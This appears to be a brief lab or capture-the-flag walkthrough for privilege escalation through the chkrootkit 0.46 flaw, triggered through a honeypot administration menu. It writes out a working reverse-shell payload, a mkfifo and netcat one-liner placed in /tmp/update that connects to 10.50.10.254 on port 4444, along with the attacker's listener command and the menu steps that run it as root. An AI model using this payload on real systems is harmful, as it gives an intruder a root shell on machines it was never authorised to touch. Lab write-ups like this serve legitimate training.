If there are any check root lit apps, have a look if they are vulnerable.
Example  chkrootkit 0.46 has a exploit whereby you can do priviledge escaltion:

in our example, the check rootkit command is:
```
./honeypot.decoy 
--------------------------------------------------

Welcome to the Honey Pot administration manager (HPAM). Please select an option.
1 Date.
2 Calendar.
3 Shutdown.
4 Reboot.
5 Launch an AV Scan.
6 Check /etc/passwd.
7 Leave a note.
8 Check all services status.
```

For this exploit, you will need to crate a file "update" in the /tmp/update file and set it to create a reverse shell:
```
echo 'rm /tmpf;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.50.10.254 4444 >/tmp/f' > /tmp/update
```

Now open a reverse shell listen on your Kali:
```
nc -nlvp 4444
```

Now run the chkrootlik executable and start and AV scan.
```
./honeypot.decoy 
--------------------------------------------------

Welcome to the Honey Pot administration manager (HPAM). Please select an option.
1 Date.
2 Calendar.
3 Shutdown.
4 Reboot.
5 Launch an AV Scan.
6 Check /etc/passwd.
7 Leave a note.
8 Check all services status.

Option selected:5

The AV Scan will be launched in a minute or less.
--------------------------------------------------
```

Wait for the shell to connect.